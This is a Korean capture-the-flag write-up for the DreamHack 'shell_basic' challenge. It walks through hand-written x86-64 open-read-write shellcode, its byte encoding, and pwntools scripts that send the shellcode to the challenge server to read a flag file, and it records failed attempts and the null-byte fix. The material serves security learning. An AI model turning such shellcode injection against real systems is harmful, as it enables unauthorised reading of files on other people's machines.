---
title:  "[DreamHack] shell_basic 풀이"
categories:
    - Pwnable
tags:
    - dreamhack.io
toc: true
published: true
---
[DreamHack] shell_basic 풀이

# Environments

|Name|Config|
|:---:|:---|
|CPU|Intel Core i7 4770|
|Architecture|Intel64|
|OS|Ubuntu 16.04.7 LTS|
|Tools|- Pwntools|

# Problem
![](/assets/DreamHack/shell-basic-00.png)
```
Print `shellcode: `
Get Input
```

- URL: [dreamback.io/wargame/challenges/410](https://dreamhack.io/wargame/challenges/410/)
- 요약: `shell_basic` 및 서버로부터 ORW를 통해 flag 찾기

# File Format
![](/assets/HCTF/shell-basic-01.png)

> x86 ELF LSB Executable, Not Stripped, Not UPX Packed

# checksec

|Name|Status|
|:---:|:---|
|CANARY|disabled|
|FORTIFY|disabled|
|NX|ENABLE|
|PIE|ENABLE|
|RELRO|FULL|

- Can't overwrite GOT, NX Bypass with ROP

# Solution
Shell Code 와 친숙해지고, ORW에 대한 전반적인 이해를 위한 간단한 문제 같다.

공부한 내용을 바탕으로 문제에서 요구하는 것을 짜보았다. ASCII 코드 옮기는게 가장 고되었다.

## shell_basic.asm
```
section .text
global _start
_start:
    ; Push and Open
    mov rax, 0x676E6F6F6F6F6F6F ; push 'oooooong'
    push rax
    mov rax, 0x6C5F73695F656D61 ; push 'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63 ; push 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65 ; push 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f ; push '/home/sh'
    push rax
    mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
    xor rsi, rsi    ; rsi = 0 ; RD_ONLY
    xor rdx, rdx    ; rdx = 0
    mov rax, 2      ; rax = 2 ; syscall_open
    syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

    ; Read, len 
    mov rdi, rax      ; rdi = fd, rdi has len value from Open syscall
    mov rsi, rsp
    sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
    mov rdx, 0x30     ; rdx = 0x30     ; len
    mov rax, 0x0      ; rax = 0        ; syscall_read
    syscall           ; read(fd, buf, 0x30)

    ; Write
    mov rdi, 1        ; rdi = 1 ; fd = stdout
    mov rax, 0x1      ; rax = 1 ; syscall_write
    syscall           ; write(fd, buf, 0x30)

    ; Exit
    mov rax, 0x3C     ; rax = 60
    mov rdi, 0        ; rdi = 0
    syscall           ; exit
```

## shell_basic.o
asm 파일이 완성되었다면 이제 `.o` 파일로 기계어화 시켜야 한다.

`nasm -f elf64 shell_basic.asm` 명령을 통해 가능 하다.

## shell_basic.bin
`objcopy --dump-section .text=shell_basic.bin shell_basic.o` 명령을 통해 Byte Code 화 한다.

## exevc Shell Code
![](/assets/DreamHack/shell-basic-02.png)

이제 나온 값을 열심히 필요하지 않은 것들을 쳐낸다.

```
\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05
```

# Exploit Code
```
context.log_level       = "DEBUG"
context.arch            = "amd64"

p = remote("host1.dreamhack.games", 22968)

shell = b"\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05"

p.recvuntil("shellcode: ")
p.sendline(shell)
p.interactive()
```

![](/assets/DreamHack/shell-basic-03.png)

는 실패하였다. 알 수 없는 값이 반환 되었다. 이거 딱 `400` 에러 느낌이다.

# Exploit Code #2
[Pwntools Docu](https://docs.pwntools.com/en/stable/) 의 힘을 빌려 `shellcraft` 를 다시 써본다.

```
from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"

p = remote("host1.dreamhack.games", 22968)
fpath = "/home/shell_basic/flag_name_is_loooooong"

shell = shellcraft.open(fpath)
shell += shellcraft.read("rax", "rsp", "0x30")
shell += shellcraft.write(1, "rsp", "0x30")

p.recvuntil("shellcode: ")
p.sendline(asm(shell))
p.interactive()
```

![](/assets/DreamHack/shell-basic-04.png)

`shellcraft`의 Assembling 보면 처음에 `push 1`을 한다. 왜 해야하는가에 대한 의문이 들어 지인을 통해 알게 된 결과, `rsp` 와 opcode 간 구분을 위하여 `NULL` 이나 `SOH` 같은 값을 넣어 구분을 해야 한다고 한다. 바람직 한 것은 `NULL` 로 알려주는 것.

# Exploit Code #3
따라서 `shell_basic.asm` 파일에 Stack 에 `push 0x00` 을 넣고 나온 byte code를 보면 `\x6a\x00` 를 추가한다.

```
context.log_level       = "DEBUG"
context.arch            = "amd64"

p = remote("host1.dreamhack.games", 22968)

shell = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05"

p.recvuntil("shellcode: ")
p.sendline(shell)
p.interactive()
```

# Result
![](/assets/DreamHack/shell-basic-05.png)

드디어 정상적인 값이 돌아왔다. `NULL`을 놓쳐서 일요일을 왜 허비하였는가 공허.